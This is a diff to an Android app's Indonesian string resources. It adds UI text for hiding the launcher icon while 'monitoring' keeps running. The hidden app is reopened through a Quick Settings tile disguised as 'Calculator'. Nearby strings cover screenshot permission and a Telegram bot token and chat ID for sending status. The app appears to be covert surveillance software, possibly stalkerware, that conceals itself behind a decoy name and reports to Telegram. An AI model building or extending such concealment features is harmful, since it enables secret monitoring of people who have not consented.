@@ -50,6 +50,12 @@
     <string name="setup_shot_ok">Izin ambil layar diberikan</string>
     <string name="setup_shot_denied">Ambil layar ditolak</string>
     <string name="setup_shot_unsupported">Ambil layar tak didukung di HP ini</string>
+    <string name="setup_hide_icon">Sembunyikan ikon launcher</string>
+    <string name="setup_show_icon">Tampilkan ikon launcher</string>
+    <string name="setup_hide_icon_confirm">Ikon aplikasi hilang dari layar utama dan daftar aplikasi; aplikasi TIDAK terhapus dan pemantauan tetap jalan. Cara buka halaman ini lagi: ketuk tile "Calculator" di panel notifikasi (Quick Settings), atau ketuk notifikasi pemantauan. Ikon juga bisa ditampilkan lagi dari sini kapan saja.</string>
+    <string name="setup_hide_icon_done">Ikon disembunyikan. Buka lagi lewat tile "Calculator" di panel notifikasi atau notifikasi pemantauan.</string>
+    <string name="setup_show_icon_done">Ikon launcher ditampilkan lagi.</string>
+    <string name="setup_hide_icon_fail">Gagal mengubah ikon launcher</string>
     <string name="setup_status_sent">Status terkirim — cek Telegram</string>
     <string name="setup_fill_all">Isi Token Bot dan Chat ID dulu</string>
     <string name="setup_bad_token">Format token salah, harus mengandung :</string>
